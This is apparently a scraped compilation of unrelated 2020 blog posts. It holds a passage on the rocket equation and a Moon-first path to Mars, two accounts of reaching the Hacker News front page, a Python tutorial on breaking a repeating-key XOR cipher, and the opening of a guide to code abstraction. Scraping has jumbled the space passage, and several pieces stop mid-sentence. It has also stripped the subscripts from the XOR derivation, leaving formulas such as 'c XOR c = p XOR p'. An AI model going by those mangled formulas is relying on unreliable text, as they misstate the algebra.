<div><figure><img src="https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/super-earth-size-comparison.jpg?fit=1024%2C546&amp;ssl=1" alt="" srcset="https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/super-earth-size-comparison.jpg?w=1499&amp;ssl=1 1499w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/super-earth-size-comparison.jpg?resize=1024%2C546&amp;ssl=1 1024w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/super-earth-size-comparison.jpg?resize=200%2C107&amp;ssl=1 200w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/super-earth-size-comparison.jpg?resize=768%2C409&amp;ssl=1 768w, https://i0.wp.com/jatan.space/wp-content/uploads/2020/07/super-earth-size-comparison.jpg?resize=1200%2C640&amp;ssl=1 1200w" sizes="(max-width: 1200px) 100vw, 1200px"><figcaption>Size comparison of a Super Earth (artist’s impression) to Earth and Neptune.

<p>Many of these Super Earths lie in the respective habitable zones around their stars i.e. conditions there could support life as we know it. Given that we’ve only searched a small fraction of our galaxy for planets, it’s fair to say there could be millions of Super Earths, many of which could host life.</p>



<p>If intelligent life were to develop on these Super Earths, they’d have a hard time building rockets that get things off-planet. Since even the most energetic chemical rockets won’t get them to space, they’d be incentivized to build something with more thrust that can, like nuclear propulsion based rockets. These will likely be far more expensive than chemical rockets but sometimes nature doesn’t give you a choice.</p>

<p>Just like the rocket equation makes it exponentially harder to get off a planet with added mass to the planet, it also makes it exponentially easier to get off objects with lesser gravity. Now if only we had an object less massive than Earth that is accessible and resourceful..</p>



<h3><strong>Ad Luna</strong></h3>



<p>In order for humanity to survive and thrive long term, it makes sense to have a permanent human settlement on Mars as the red planet offers us a relatively benign environment. That’d require sending hundreds to thousands of tons of material from Earth to the martian surface via dozens to hundreds of huge rocket launches. That’s pretty much exactly what <a href="https://www.spacex.com/vehicles/starship/">SpaceX’s Starship</a> hopes to do. That’s where our celestial neighbor, the Moon, comes in.</p>



<p>The Moon has a much weaker gravity than Earth, allowing rockets to take off with ease. This was most notable during the Apollo missions, when even a small spacecraft hosting two astronauts <a href="https://www.youtube.com/watch?v=9HQfauGJaTs">could make its way to lunar orbit</a>. Moreover, the Moon lies at the outer edge of Earth’s gravity well, meaning it’s easy to escape our planet’s pull completely if launched from the Moon. Almost five times easier in fact.</p>



<p>If we establish a vast, permanent settlement on the Moon first, we can eventually tap into its resources to launch rockets from the Moon itself. NASA and ISRO missions have <a href="https://jatan.space/how-nasa-and-chandrayaan-discovered-water-on-the-moon/">discovered plenty of water ice</a> on the Moon’s poles. It’s possible that future human habitats built from mining the metal-rich lunar soil tap into this water ice for consumption needs. This water can also be split into hydrogen and oxygen for use as rocket fuel. Rockets taking off from an industrially enabled Moonbase can ride the lunar interplanetary highway to reach Mars more efficiently than from Earth.</p>

<p>Sure, it would be expensive to build a vast, industrial Moonbase but if the goal is to expand sustainably into the solar system, we’re playing the game on the scale of hundreds to thousands of years. In this large scheme of things, the Moon can be <em>the</em> rocket platform to test and build a sustainable Mars presence at a much smaller cost than one done from Earth.</p>



<p>The Moon’s accessibility, low gravity barrier and resource potential are the reason why its proponents vouch for a sustainable return to the Moon first rather than targeting Mars. As the saying within the lunar circles goes,</p>



<blockquote><p>You can’t be a martian without being a lunatic.</p></blockquote>



<p>Being a Moon-first guy myself, I even made a meme to that effect.</p>







<h3><strong>The belt and beyond</strong></h3>



<p>The Moon’s advantages may extend to making homes for ourselves in the outer solar system as well. The rocket equation tells us that even if objects in the outer reaches of the solar may be closer to Mars than the Moon, the red planet’s deeper gravity well means more energy is required to get out of it than to reach those destinations from there.</p>



<p>Getting to the asteroid belt from the Moon’s surface is at least 40% less energy demanding for a rocket than from Mars’ surface – even though Mars is about <em>75 million km</em> closer to the belt! This is the difference gravity makes, and which the rocket equation allows us to see. The Moon can accelerate expanding settlements to these resource-rich asteroids. Some of these objects, like Ceres and Vesta, can in turn play the same role as the Moon can for Mars and the asteroid belt, and expand human settlements to moons of Jupiter and Saturn, and beyond.</p>

A fleet of spaceships are lined up and approaching a docking area seen as glowing lights. <a href="http://www.erikwernquist.com/wanderers/gallery_excavation.html">Credit: Erik Wernquist</a></figcaption></figure>



<p>This finally brings us to the single most important takeaway from the rocket equation. The ability to extract and harness raw materials from low-gravity, resourceful space objects would free us from the tyranny of dragging everything out of Earth’s gravitational pull.</p>



<p>We cannot hope to be traveling among the stars if we don’t even expand into the solar system in an Earth-independent way and avail for ourselves a much larger resource pool. In-space manufacturing and industrialization is not just a good-to-have but a fundamental requirement for <a href="https://www.youtube.com/watch?v=YH3c1QZzRK4&amp;feature=emb_title">expansion into the solar system</a>. Only then humanity will be in an adequate position to venture to the nearest star and hopefully do it <a href="https://jatan.space/timeline-for-life-until-the-end-of-the-universe/">before the Sun …</a></p></div></article></div></div></main></div></div>

			<p>Today I’m going to tell the story of fleeting success. You’ll learn how my article reached the hacker news front page. And how it stayed there for two whole days, changing my perception about what is achievable with my writing hobby.</p>

<p>I started this blog as a new year’s resolution for 2020. One article per week. I didn’t have gigantic aspirations. I wanted to learn how to express myself better because <a href="https://blog.viktomas.com/posts/remote/">remote work</a> is all about written communication. And I wanted to share thoughts about my interests.</p>
<p>First two months I didn’t publish the articles I wrote. I didn’t want to create yet another blog with only a handful posts in it. The writing had to become a habit first.</p>
<p>After I started publishing on this site, I didn’t share it with anybody until late April when I mentioned <a href="https://blog.viktomas.com/posts/plaintext-passwords/">an article</a> on <a href="https://news.ycombinator.com/item?id=22914281">hacker news</a> for the first time. Two people liked it, and about fifty read it according to my analytics.</p>
<p>On Sunday 3rd of May 2020 at 9 AM (CET) I mention my article <a href="https://blog.viktomas.com/posts/losing-google-account/">“What would you do if you lost your Google account?"</a> on <a href="https://news.ycombinator.com/item?id=23057365">hacker news</a>. I was expecting the same results: a couple dozen people read it, a few would like it. But with strike of luck, plenty of people liked the article and of it went to the front page.</p>
<p>By 10 AM, fifteen hundred people visited the site, four times the number of visits since I started the blog. In the following 24 hours, another ten thousand people viewed the blog, and by the time the article left the front page on Monday, <strong>sixteen thousand people</strong> have read it<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>. The real number is going to be over thirty thousand because <a href="https://blog.viktomas.com/posts/adblock-skews-analytics/">60% of hacker news readers don’t show in analytics thanks to AdBlock</a>.</p>
<p>I was ecstatic. The whole day I was walking with a wide grin on my face. I immediately googled the WikiHow article on <a href="https://www.wikihow.com/Handle-Fame">How To handle fame</a>. And I took plenty of screenshots because I thought that the article is bound to drop off from the front page after a few minutes and I wanted to have a memory.</p>
<p><img src="https://blog.viktomas.com/images/posts/one-hit-wonder-hn/medium.gif" alt=""></p>
<p>There was a trickle of people coming to see the article ever since. Now about fifty people view the article each week.</p>
<p>The time of my two-day fame has now passed, but I took away valuable lessons.</p>
<p>The first lesson is that I can produce something of value outside of my programming job. I knew I design and write high-quality code and systems and I get well paid for doing that. However, this experience showed me that I could create something else people enjoy.</p>
<p>The second lesson is the type of article people enjoy. The generic articles about <a href="https://blog.viktomas.com/posts/foss/">FOSS</a> and <a href="https://blog.viktomas.com/posts/meditation-introduction/">Meditation</a> are presumably not as interesting as the more down-to-earth articles that contain a few howtos that people can apply straight away. Since the “loosing your google account” article this story repeated itself once more with the <a href="https://blog.viktomas.com/posts/slip-box/">Zettlekasten article</a>. This strengthens my hypothesis that the article needs to provide useful, applicable tool/information to the readers, not just abstract food for thought.</p>
<p>I liked Robert Heaton’s <a href="https://robertheaton.com/2019/09/24/how-to-come-up-with-blog-post-ideas/">Made-Up-Award principle</a>: you should write your article to be the best in some narrow category. Exaggerated example: “best introduction to ruby programming for marketing experts focusing on food marketing”. Another important rule for me is that I have to wish I found that article a few days/weeks before because it would help me solve a problem.</p>
<p>This event gave me just enough extrinsic motivation to help me overcome the initial period when I was considering whether I want to spend eight hours each week writing an article that fifty people read. It helped me to commit to writing as the next of my many hobbies.</p>

July 4, 2020 | https://arpitbhayani.me/blogs/decipher-repeated-key-xor | <a href="https://web.archive.org/web/*/https://arpitbhayani.me/blogs/decipher-repeated-key-xor">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Encryption is a process of encoding messages such that it can only be read and understood by the intended parties. The process of extracting the original message from an encrypted one is called Decryption. Encryption usually scrambles the original message using a key, called the encryption key, that the involved parties agree on.</p>
<p>In the previous essay, we went through the <a href="https://arpitbhayani.me/blogs/decipher-single-xor">Single-byte XOR cipher</a> and found a way to decipher it without having any knowledge of the encryption key. In this essay, we find how to break a <a href="https://en.wikipedia.org/wiki/XOR_cipher">Repeating-key XOR cipher</a> with variable key length. The problem statement, defined above, is based on <a href="https://cryptopals.com/sets/1/challenges/6">Cryptopals Set 1 Challenge 6</a>.</p>

<p>The Repeating-key XOR cipher algorithm works with an encryption key with no constraint on its length, which makes it much stronger than a Single-byte XOR Cipher, where the encryption key length was restricted to a single byte.</p>
<h2>Encryption</h2>
<p>A plain text is encrypted using an encryption key by performing a bitwise <a href="https://en.wikipedia.org/wiki/Exclusive_or">XOR</a> operation on every character. The encryption key is repeated until it XORs every single character of the plain text and the resultant stream of bytes is again translated back as characters and sent to the other party. These encrypted bytes need not be among the usual printable characters and should ideally be interpreted as a stream of bytes. Following is the python-based implementation of this encryption process.</p>
<pre><code><span><span>def</span> <span>repeating_key_xor</span><span>(text: bytes, key: bytes)</span> -&gt; bytes:</span>
    <span>"""Given a plain text `text` as bytes and an encryption key `key`
    as bytes, the function encrypts the text by performing
    XOR of all the bytes and the `key` (in repeated manner) and returns
    the resultant XORed byte stream.
    """</span>
    
    
    
    repetitions = <span>1</span> + (len(text) // len(key))
    key = key * repetitions
    key = key[:len(text)]

    
    <span>return</span> bytes([b ^ k <span>for</span> b, k <span>in</span> zip(text, key)])
</code></pre>
<p>As an example, we encrypt the plain text - <code>secretattack</code> - with encryption key <code>$^!</code> and as per the algorithm, we first repeat the encryption key until it matches the length of the plain text and then XOR it against the plain text. The illustration below shows the entire encryption process.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/85919742-d1520600-b88b-11ea-8d71-aa36c58dc48a.png" alt="https://user-images.githubusercontent.com/4745789/85919742-d1520600-b88b-11ea-8d71-aa36c58dc48a.png"></p>
<p>For the first character in plain text - <code>s</code> - the byte i.e. ASCII value is <code>115</code> which when XORed with <code>$</code> results in <code>87</code> whose character equivalent is <code>W</code>, similarly for the second character <code>e</code> the encrypted byte is <code>;</code>, for <code>c</code> it is <code>B</code>, for the fourth character <code>r</code>, since the key repeats, the XOR is taken with <code>$</code> to get <code>V</code> and the process continues. The resultant encrypted text using repeated-key XOR on the plain text <code>secretattack</code> with key <code>$^!</code> is <code>W;BV;UE*UE=J</code>.</p>
<h2>Decryption</h2>
<p>Decryption is a process of extracting the original message from the encrypted ciphertext given the encryption key. XOR has a <a href="https://brainly.in/question/3038497">property</a> - if <code>a = b ^ c</code> then <code>b = a ^ c</code>, hence the decryption process is exactly the same as the encryption i.e. we first repeat the encryption key till it matches the length and then perform bitwise XOR with the ciphertext - the resultant bytes stream will be the original message.</p>
<p>Since encryption and decryption both have an exact same implementation - we pass the ciphertext to the function <code>repeating_key_xor</code>, defined above, to get the original message back.</p>
<pre><code><span>&gt;&gt;&gt; </span>repeating_key_xor(<span>b'W;BV;UE*UE=J'</span>, <span>b'$^!'</span>)
<span>b'secretattack'</span>
</code></pre>

<p>Things become really interesting when, given the encryption algorithm, we have to recover the original message from the ciphertext with no knowledge of the encryption key. Just like solving any other problem, the crux of deciphering the message encrypted using repeated-key XOR cipher is to break it down into manageable sub-problems and tackle them independently. We break this deciphering problem into the following two sub-problems:</p>
<ul>
<li>Finding the length of the Encryption Key</li>
<li>Bruteforce with all possible keys and finding the "most English" plain text</li>
</ul>
<h2>Finding the length of the Encryption Key</h2>
<p>In order to recover the original text from the cipher, we first find the length of the encryption key used and then apply brute force with all possible keys of the estimated length and deduce the plain text. Finding the length of the Encryption key makes the deciphering process quicker as it eliminates a lot of false keys and thus reducing the overall effort required during the brute force. In order to find the length of the Encryption Key, we need to have a better understanding of a seemingly unrelated topic - Hamming Distance.</p>
<h3>Hamming Distance</h3>
<p>Hamming distance between two bytes is the number of positions at which the corresponding bits differ. For a stream of bytes, of equal lengths, it is the sum of Hamming Distances between the corresponding bytes. Finding differences between bits can be efficiently done using bitwise XOR operation as the operation yields <code>0</code> when both the bits are the same and <code>1</code> when they differ. So for computing Hamming Distance between two bytes we XOR the bytes and count the number of <code>1</code> in its binary representation.</p>
<pre><code><span><span>def</span> <span>hamming_distance_bytes</span><span>(text1: bytes, text2: bytes)</span> -&gt; int:</span>
    <span>"""Given two stream of bytes, the function returns the Hamming Distance
    between the two.
    Note: If the two texts have unequal lengths, the hamming distance is
    computed only till one of the text exhausts, other bytes are not iterated.
    """</span>
    dist = <span>0</span>
    <span>for</span> byte1, byte2 <span>in</span> zip(text1, text2):
        dist += bin(byte1 ^ byte2).count(<span>'1'</span>)
    <span>return</span> dist

<span>&gt;&gt;&gt; </span>hamming_distance_bytes(<span>b'ab'</span>, <span>b'zb'</span>)
<span>4</span>
</code></pre>
<p>In the example above, we find that the hamming distance between two bytestreams <code>ab</code> and <code>zb</code> is <code>4</code>, which implies that the byte streams <code>ab</code> and <code>zb</code> differ at <code>4</code> different bits in their binary representations.</p>
<h3>Hamming Score</h3>
<p>Hamming distance is an absolute measure, hence in order to compare hamming distance across byte streams of varying lengths, it has to be normalized with the number of pairs of bits compared. We name this measure - Hamming Score - which thus is defined as the Hamming Distance per unit bit-pair. In python, Hamming Score is implemented as:</p>
<pre><code><span><span>def</span> <span>hamming_score_bytes</span><span>(text1: bytes, text2: bytes)</span> -&gt; float:</span>
    <span>"""Given two streams of bytes, the function computes a normalized Hamming
    Score based on the Hamming distance.
    Normalization is done by dividing the Hamming Distance by the number of bits
    present in the shorter text.
    """</span>
    <span>return</span> hamming_distance_bytes(text1, text2) / (<span>8</span> * min(len(text1), len(text2)))

<span>&gt;&gt;&gt; </span>hamming_score_bytes(<span>b'ab'</span>, <span>b'zb'</span>)
<span>0.25</span>
</code></pre>
<h3>What can we infer through Hamming Distance?</h3>
<p>Hamming Distance is an interesting measure; it effectively tells us the minimum number of bit flips required to convert one bytestream into another. It also implies that (on average) if the numerical values of two bytestreams are closer then their Hamming Distance and Hamming Score will be lower i.e it would take fewer bit flips to convert one into another.</p>
<p>This is evident from the fact that the average Hamming distance between any two bytes <code>[0-256)</code> picked at random is <code>3.9999</code> while that of any two lowercased English characters <code>[97, 122]</code> is just <code>2.45</code>. Similar ratios are observed for Hamming Score where <code>0.4999</code> is of the former while <code>0.3072</code> is of the later.</p>
<p>This inference comes in handy when we want to find out the length of Encryption Key in Repeating-key XOR Cipher as illustrated in the section below.</p>
<h3>Formal definition of encryption and decryption processes</h3>
<p>Say if <code>p</code> denotes the plaintext, <code>k</code> denotes the encryption key which is repeated to match the length of the plain text, and <code>c</code> denotes the ciphertext, we could define encryption and decryption processes as</p>
<pre><code>encryption: c[i] = p[i] XOR k[i]   <span>for</span> i <span>in</span> [<span>0</span>, len(c))
decryption: p[i] = c[i] XOR k[i]   <span>for</span> i <span>in</span> [<span>0</span>, len(p))
</code></pre>
<p>The above definitions, along with the rules of XOR operations, implying that if we XOR two bytes of the ciphertext, encrypted (XORed) using the same byte of the encryption key, we are effectively XORing the corresponding bytes of the plain text. If <code>k'</code> is the byte of the encryption key <code>k</code> which was used to encrypt (XOR) the bytes <code>p[i]</code> and <code>p[j]</code> of the plain text to generate <code>c[i]</code> and <code>c[j]</code> of the ciphertext, we could derive the following relation</p>
<pre><code># k' <span>is</span> the common byte <span>of</span> the key i.e. k' = k = k

c XOR c = (p XOR k') XOR (p XOR k')
              = p XOR k' XOR k' XOR p
              = p XOR 0 XOR p
              = p XOR p
</code></pre>
<p>The above relation, <code>c[i] XOR c[j]</code> equal to <code>p[i] XOR p[j]</code>, holds true only because both the bytes were XORed with the same byte <code>k'</code> of the encryption key; which in fact helped reduce the expression. If the byte from the encryption key which was used to XOR the pain texts were different then the relation was irreducible and we could not have possibly setup this relation.</p>
<h3>Chunking of ciphertext</h3>
<p>Chunking is the process where the ciphertext is split into smaller chunks (segments) of almost equal lengths. For example, chunking the ciphertext <code>W;BV;UE*UE=J</code> for chunk length <code>4</code> would create <code>3</code> chunks <code>W;BV</code>, <code>;UE*</code> and <code>UE=J</code>. The illustration below shows the chunks that would be formed for <code>W;BV;UE*UE=J</code> with chunks lengths varying from 2 to 6.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/86434084-24a7d680-bd1a-11ea-8346-aad7b42bab1c.png" alt="https://user-images.githubusercontent.com/4745789/86434084-24a7d680-bd1a-11ea-8346-aad7b42bab1c.png"></p>
<h3>XOR of the chunks</h3>
<p>Something very interesting happens when we compute the Average Hamming Score for all possible chunk lengths. If we consider the ciphertext <code>b'W;BV;UE*UE=J</code> and we chunk it with lengths varying from 2 to 6, we get the following distribution for the Average Hamming Score for each of the chunk length.</p>

<p>From the distribution above it is evident that the score was minimum at chunk length equalling <code>3</code>, which actually was the length of the Encryption Key used on the plain text. Is this mere coincidence or are we onto something?</p>
<p>When chunk length is equal to the length of the encryption key, the XOR operation on any two chunks will reduce the expression to XOR of the corresponding plain texts (as seen above), because there will be a perfect alignment of bytes from ciphertext and bytes from the keys i.e every <code>i</code>th byte from both the chunks would have been XORed with <code>i</code>th byte from the encryption key.</p>
<p>We have established that for chunk length equal to the length of the encryption key <code>c[i] XOR c[j]</code> …</p></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Last Sunday I published a piece of content for the very first time on hacker news and it ended up getting the #3 spot for a few hours and stayed on the front page for an <a href="https://news.ycombinator.com/front?day=2020-06-28" target="_blank">entire day.</a> The post was about <a href="https://www.sankalpjonna.com/posts/our-aws-bill-is-2-of-revenue-heres-how-we-did-it" target="_blank">how we managed to get our AWS bill to &lt; 2% of our revenue</a>.</p><figure id="w-node-70cd5a19b74c-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f015791310d7d85125fef6b_O4P4rEPlKnx7Ng3ZdLmcl81BEdrR4uXkGzmWUwvFM9Ibl9UOF87Zi-4gIjv0F0MdYcbPlL0q_q3RiCywpMppiPUTyLqgVMoR6idh7sVNCR5LiPyWnYgf02BdaG1GBh6C6aenbS3H.png" alt=""></p><figcaption>Hacker News front page</figcaption></figure><p>This was a super thrilling experience for me because I have been a reader of Hacker news for a while but never actually posted anything or even created an account. This is why I had to ask my co-founder <a href="https://twitter.com/hipreetam93" target="_blank">Preetam</a> to post on my behalf as I did not have enough Karma points to even make one post!</p><p>‍</p><p>So I decided to continue this feedback loop of <strong>writing -&gt; being recognized -&gt; writing some more as a result</strong> by talking about what went into writing this post and what were the consequences of being featured on Hacker news.&nbsp;</p><p>‍</p><div><p>There were 3 primary reasons for this post&nbsp;</p></div><ol role="list"><li>Taking the first step at making a series of posts explaining how we solved various problems while building our <a href="https://apps.shopify.com/whatsapp-chat-button" target="_blank">WhatsApp Shopify app</a>. Problems that other indie hackers can relate to and hopefully not reinvent the wheel while solving them. We were hesitant to do this at first because we were afraid of competitors reading these posts and copying our strategies, but we realised recently that what we stand to gain from making a place for ourselves in this community outweighs the risk of competitors giving us trouble.</li></ol><ol start="2" role="list"><li>We plan to build more of such products in the future and It became very clear to us that we have to build our own distribution channels to get users instead of relying on a 3rd party channel like the Shopify App Store which we currently rely on to get 100% of our users. This post was the first attempt to drive some traffic to my personal blog, traffic that we can hopefully use to get the initial customers for our next venture.</li></ol><ol start="3" role="list"><li>An attempt to heal my imposter syndrome which kept holding me back over the years and prevented me from voicing my thoughts in public due to the fear of getting criticised. When I read all the negative comments to my post I realised that negative comments do not necessarily come from a negative place and the people posting such comments are just trying to voice their thoughts based on the unique situations that they deal with on a day to day basis. This means that criticism is very essential for growth</li></ol><p>‍</p><p><strong>Power of Hacker news and Reddit</strong>‍</p><p>‍</p><p>I posted this piece on<a href="http://reddit.com/r/Entrepreneur/" target="_blank"> reddit.com/r/Entrepreneur/</a> and Hacker news and at the time of making the post it did not occur to me that I should track the users that are visiting my blog as a result of these posts even though that was one of the primary intentions behind the post.&nbsp;</p><p>‍</p><p>I finished writing and publishing the post and went offline for a few hours when my co-founder <a href="https://twitter.com/hipreetam93" target="_blank">Preetam</a> texts me saying my post is on the front-page and I should add Google Analytics to my blog ASAP if I have not done it already. I quickly do so and start seeing results immediately&nbsp;</p><figure id="w-node-0de8a57abe57-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f015791594ffa6c974ece60_UPCnJKN5cQEljrF22coESNJOE3d7jZwgWNP8xLEkih0T_y5oR0-zYbdVHPN-Lh7ieejS0qmnWW9y2MFDkuo_n71O_zbIs5vZIZ5xAg1IDNaWT0YHP7BPJtgzhIVfwSp3bcWWLjLV.png" alt=""></p><figcaption>Google analytics data</figcaption></figure><p>‍</p><p>As you can see I got ~14k visits on my blog the day I posted it and since I added GA a few hours late, I am assuming I got around 20k or more visits. This was mind blowing to me.&nbsp;</p><figure id="w-node-de58744503f8-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f0157926dc9fcea598afa19_eXlhXdTDtdZx3rEncGgJrkkYR2XtySsWwjIR8Hof3N5RTJ3Gzblq7VaMfy1kmCjZRclUl8er-rEhvWx81p7bV632AI_TzADpLSPv1eGFFPLBbSgWAAZHzW9_ALR0AOgxlsyai-qY.png" alt=""></p><figcaption>Google analytics data</figcaption></figure><p>Looking into the data further it is quite clear that most of the traffic came from Hacker news. The fact that I had access to this kind of traffic and all I had to do was write about something that I myself experienced has given me a new perspective that is backed by actual numbers and graphs. We have all heard people tell us that it is important to write, but this can clearly be backed with actual numbers.&nbsp;</p><p>A few more things happened as a result of this post. I gained some new twitter followers, had engaging conversations with some of them and somebody even suggested that I add an RSS feed to my site so that they can follow my blog easily.&nbsp;</p><figure id="w-node-7aef82240888-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f015792e08dc7f5ad78f64b_dzsKkucLoEIlELWuS-2wMH3FsDPvL0abSgho2aEkTvihuHdoD0d7GTGBPtBrn0cEOhOtqs_csRmKdv9VK0GSkacNfALtQr4ByN0nA5S930229eCXsYaZ12_n6ZSAcuGtiHzNkPUY.png" alt=""></p><figcaption>Good folks of twitter helping me out</figcaption></figure><p>For someone who started writing for the first time, seeing so much visible evidence of the benefits of writing has certainly done a lot to fuel my desire to write even more. I am yet to discover what this means in the long run when the post matures enough to start ranking on google search.</p><p><strong>Learnings from people who read the post</strong>‍</p><p>‍</p><p>Here is a TLDR for folks who have not read the post: Use Lightsail, Amazon's approximation of a dedicated server.</p><p>The post highlighted how we managed to save a lot on AWS bills in exchange for sacrificing a bit of resilience and some folks did not take kindly to this fact.</p><figure id="w-node-48d76d4377b1-87eecd11"><p><img src="https://uploads-ssl.webflow.com/5e0b01877436086c8beecd1a/5f015792e830705462abc486_Zrrh_CUjp34hKeGUfsUwkFrV0E-eYtWOr3JnnzrAX-cPIl9K3BtiXxWnH_-m96m42GPnuxNAyfN_ohXlJBW-1K6eWwqNRxWK6oZgzN18fIdE1ouGAb5iKfMrM3LNIK6JjBzu2UdM.png" alt=""></p><figcaption>Harsh comment from a redditor</figcaption></figure><p>When I set up my app on AWS, it did not occur to me that Redundancy was super important. This is because we had the ability to do point in time restores of the Database and launch a new instance in case a disaster ever stuck, but what I failed to consider was the fact that sometimes an entire region in AWS can go dark in which case we won’t have the ability to do a restoration from a backup if that backup is on a region that is down. This is something that I have duly noted and will take into account going forward.</p><p>The above comment though harsh was a useful learning for me which would probably help me in the future but there were also comments that were not going to help anybody at all and my learnings from those comments was to not let them affect you. Find the feedback that will be useful in the long run and ignore the rest. The rest is just noise.</p><p>There were also many positive comments from people who found the post helpful and someone even commented that they moved all their instances to Lightsail after reading my post. There were people who appreciated the fact that I put a disclaimer at the end of my post explicitly saying that this is not a holy grail solution that will work for everyone and it is just something that worked for us.&nbsp;</p><p>Overall the learnings were all net positive and I look forward to sharing more and learning even more from the comments of all my future posts.</p><p><strong>Closing note</strong>‍</p><p>‍</p><p>I would like to conclude by encouraging anyone wanting to share their experiences to write and not be afraid to post it in public because it is totally worth it. You get some validation and you also get criticized but you will certainly find out that even after getting criticized, you are still alive and life goes on.</p></div></div>]]>

<![CDATA[Beginner's Guide to Abstraction]]>

July 4, 2020 | https://jesseduffield.com/beginners-guide-to-abstraction/ | <a href="https://web.archive.org/web/*/https://jesseduffield.com/beginners-guide-to-abstraction/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-75">
	<!-- .entry-header -->

	
	
	<div>
		<p>In <em>The Pragmatic Programmer</em>, Andrew Hunt and David Thomas introduced the DRY (Don't Repeat Yourself) principle. The rationale being that if you see the same code copy+pasted 10 times you should probably factor that code into its own method/class.</p>
<p>But then Sandi Metz came along and <a href="https://www.sandimetz.com/blog/2016/1/20/the-wrong-abstraction">said</a>:</p>
<blockquote>
<p>Duplication is far cheaper than the wrong abstraction.</p>
</blockquote>
<p>And so the eternal war began.</p>
<h3>What is abstraction?</h3>
<p>For the purposes of this post I'm referring to the kind of abstraction as described in the <a href="https://en.wikipedia.org/wiki/Abstraction_(computer_science)#Abstraction_in_object_oriented_programming">Abstraction Principle</a>, which Wikipedia describes like so:</p>
<blockquote>
<p>In software engineering and programming language theory, the abstraction principle (or the principle of abstraction) is a basic dictum that aims to reduce duplication of information in a program (usually with emphasis on code duplication) whenever practical by making use of abstractions provided by the programming language or software libraries</p>
</blockquote>
<p>This post has nothing to say about the conceptual kind of abstraction where from the concrete examples of 'Parrot' and 'Sparrow' you create an abstraction of 'Bird'. This post is about duplicated code, how to respond to it, and how to respond to other people's responses to it.</p>
<p>I define the verb 'abstraction' to be an <em>attempt</em> to reduce complexity by combining repeated commonality into some generalisation. And so, the noun 'abstraction' is the result of that attempt. If you're somebody who believes abstraction is by definition a <em>successful</em> attempt, feel free to substitute the term 'wrong abstraction' with 'failure to abstract' throughout this post.</p>
<p>The process of abstraction typically goes like this:<br>
1) you identify different chunks of code that you think are all essentially doing the same thing<br>
2) you create a method or a class with a narrow interface which can be substituted in for all the chunks of code you found<br>
3) you go and swap out the chunks of code with a call to your method/class</p>
<h3>Abstraction is always a gamble</h3>
<p>In the world of software engineering, when requirements are always changing, every abstraction is a gamble. When you make an abstraction over some concrete things, you're making a bet that the concrete things are more similar than they are different, and that their similarities are not mere coincidences: that there is a common purpose shared by the concrete things which would lead them to evolve in lockstep as requirements evolve. If you win the bet, your codebase will be easier to work in and adding new use cases via your abstraction will be trivially easy. If you lose, you'll see a flash of fear in your colleague's eyes whenever they're assigned a ticket to make yet another extension to the misfigured monster that the once-innocent abstraction has now become</p>
<p>But risk abounds everywhere, and leaving duplicated code unabstracted is its own gamble. You're betting that the chunks of code will evolve in separate directions as requirements change and that their current similarities are more coincidence than a reflection of their common purpose. Win the bet and your colleague gets to sleep soundly at night knowing they won't be facing the abstraction monster at work the next day. Lose, and code that should have evolved in lockstep is now implemented in completely different ways across different files, where a developer fixes a bug identified in one place, only for the same bug to be reported days later in a completely different file.</p>
<p>Your job is to get good at making the right bets.</p>
<h3>The right/wrong abstraction</h3>
<p>You'll know that you've made the <em>right</em> abstraction when a long time passes and you haven't needed to expand the interface (an example of expanding the interface is adding an optional flag argument). You'll also know you've made the right abstraction when another developer doesn't find it that much harder to understand how the code behaves for a given use case than if somebody had written the code to satisfy the use case without the abstraction.</p>
<p>You'll know you've made the <em>wrong</em> abstraction when after a while the interface has been expanded to support various optional flags, each for a different use case, and you need to be a genius to reason about what the code will actually do for a given use case. By the way, if you have a string arg that merely gets fed into a switch statement inside a method and for each new use case you come up with a new accepted value for it, you <em>are</em> expanding the implicit interface, even if that fact isn't captured in your type system.</p>
<p>There is plenty of daylight between the perfect abstraction and the completely wrong abstraction (perhaps the interface needs to be fundamentally changed but afterwards you're back to having a good abstraction), and so the point of this section isn't to prescribe how much you should be abstracting, but to encourage you to think about both perspectives and be able to make a case in a PR review for why you think an abstraction should/should-not exist.</p>
<h3>Do you over or under-abstract?</h3>
<p>Given it is impossible to make the right decision with regards to abstraction every time, you are probably either somebody who over-abstracts or somebody who under-abstracts.</p>
<p>If common feedback on your PR reviews is that you should DRY up your code, you could probably benefit from doing a scan for duplicated code before submitting a PR and considering whether it belongs in its own method/class.</p>
<p>If you commonly get feedback that your methods are hard to understand because they support too many disparate use cases at once, you are probaby over-abstracting and should consider whether you should increase your tolerance for duplication.</p>
<p>Note that it's not always as simple as under-abstracting vs over-abstracting. Sometimes abstraction is appropriate, but you might take the wrong approach. If an abstraction is deemed wrong by the team, that doesn't mean no abstraction is necessarily the best alternative.</p>
<h3>Under-abstraction examples</h3>
<p>The main sign that you could be under-abstracting is that you have a heap of code doing the exact same thing called in a heap of places with no obvious reason why anybody would want the code to diverge.</p>
<h4>Example: Hard-coded formulas</h4>
<h5>Bad:</h5>
<pre><code># sphere has radius of 11
sphere_volume = 4*Math::PI/3*11**3
puts "the volume of the sphere is #{sphere_volume} cm^3"
...

radius = calculate_radius
volume = 4*Math::PI/3*radius**3
sphere.volume = volume</code></pre>
<h5>Good:</h5>
<pre><code>def sphere_volume(radius)
  4*Math::PI/3*radius**3
end

# sphere has radius of 11
sphere_volume = sphere_volume(11)
puts "the volume of the sphere is #{sphere_volume} cm^3"
...

radius = calculate_radius
volume = sphere_volume(radius)
sphere.volume = volume</code></pre>
